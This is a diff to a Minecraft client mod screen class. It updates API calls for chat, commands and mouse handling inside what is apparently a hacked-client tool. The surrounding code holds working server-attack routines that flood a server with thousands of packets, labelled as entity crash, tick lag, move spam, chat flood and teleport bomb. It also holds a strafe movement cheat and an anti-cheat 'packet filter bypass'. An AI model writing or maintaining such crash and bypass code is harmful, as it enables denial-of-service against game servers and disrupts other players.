@@ -251,7 +251,7 @@ public class ProfessorScreen extends Screen {
         // Proxy input field
         proxyField = new TextFieldWidget(textRenderer, x, y+26, bw-82, 18, Text.empty());
         proxyField.setMaxLength(512);
-        proxyField.setPlaceholderText("ip:port  or  socks5://ip:port  or  ip:port:user:pass");
+        proxyField.setSuggestion("ip:port  or  socks5://ip:port  or  ip:port:user:pass");
         addSelectableChild(proxyField);
 
         addDrawableChild(ButtonWidget.builder(Text.literal("ADD"),b->{
@@ -466,8 +466,8 @@ public class ProfessorScreen extends Screen {
         super.render(ctx,mx,my,delta);
     }
 
-    @Override public boolean mouseMoved(double mx, double my) {
-        lastMx=(int)mx; lastMy=(int)my; return super.mouseMoved(mx,my);
+    @Override public void mouseMoved(double mx, double my) {
+        lastMx=(int)mx; lastMy=(int)my; super.mouseMoved(mx,my);
     }
 
     // ══ ACTIONS ══════════════════════════════════════════════════════════
@@ -544,7 +544,7 @@ public class ProfessorScreen extends Screen {
             case 3->{for(int i=0;i<5000;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));flash("☠ ENTITY CRASH 5k",RED);}
             case 4->{for(int i=0;i<10000;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+bypassX(i),client.player.getY()+bypassDY(i),client.player.getZ()+bypassZ(i),bypassGround(i)));client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i%32767));}flash("☠ TICK LAG 10k",RED);}
             case 5->{for(int i=0;i<50000;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*1e6,1e8+rng.nextGaussian()*1e5,client.player.getZ()+rng.nextGaussian()*1e6,false));flash("☠ MOVE SPAM 50k",RED);}
-            case 6->{for(int i=0;i<200;i++){client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("xr"+i,null,null,net.minecraft.network.message.MessageSignatureData.absent(),false));}flash("☠ CHAT FLOOD 200",RED);}
+            case 6->{for(int i=0;i<200;i++){try{client.getNetworkHandler().sendChatMessage("xr"+i);}catch(Exception ignored){}}flash("☠ CHAT FLOOD 200",RED);}
             case 7->{for(int i=0;i<10000;i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));flash("☠ TELEPORT BOMB 10k",RED);}
         }
         addVl(50f); triggerBurst();
@@ -565,8 +565,8 @@ public class ProfessorScreen extends Screen {
     private void moveStrafe(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();float yaw=(float)Math.toRadians(client.player.getYaw());for(int i=0;i<60;i++){double s=Math.cos(i*.26)*speed*.4;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+Math.cos(yaw)*s,py2,pz+Math.sin(yaw)*s,true));}flash("🏃 Strafe ×"+speed,TXT_BRIGHT);addVl(12f);}
     private void copyCoords(){if(client==null||client.player==null){flash("Not in game",RED);return;}double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();String coords=String.format("%.2f %.2f %.2f",px,py2,pz);try{client.keyboard.setClipboard(coords);flash("✓ Coords copied: "+coords,GREEN);}catch(Exception ignored){flash("Coords: "+coords,GREEN);}}
 
-    private void doChat(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String msg=chatField.getText();int n=parseN();for(int i=0;i<Math.min(n,200);i++){try{client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket(msg,null,null,net.minecraft.network.message.MessageSignatureData.absent(),false));}catch(Exception ignored){}}flash("💬 Chat ×"+Math.min(n,200),TXT_BRIGHT);}
-    private void doCmd(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String cmd=chatField.getText();if(!cmd.startsWith("/"))cmd="/"+cmd;try{client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket(cmd,null,null,net.minecraft.network.message.MessageSignatureData.absent(),false));flash("💬 CMD: "+cmd,GREEN);}catch(Exception e){flash("Error: "+e.getMessage(),RED);}}
+    private void doChat(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String msg=chatField.getText();int n=parseN();for(int i=0;i<Math.min(n,200);i++){try{client.getNetworkHandler().sendChatMessage(msg);}catch(Exception ignored){}}flash("💬 Chat ×"+Math.min(n,200),TXT_BRIGHT);}
+    private void doCmd(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String cmd=chatField.getText();String bare=cmd.startsWith("/")?cmd.substring(1):cmd;try{client.getNetworkHandler().sendCommand(bare);flash("💬 CMD: /"+bare,GREEN);}catch(Exception e){flash("Error: "+e.getMessage(),RED);}}
 
     // ── Bypass methods ──────────────────────────────────────────────────────
     private void bypassPacketFilter(){if(np())return;for(int i=0;i<500;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+bypassX(i),client.player.getY(),client.player.getZ(),true));}flash("📦 Packet Filter Bypass 500",GREEN);addVl(5f);}
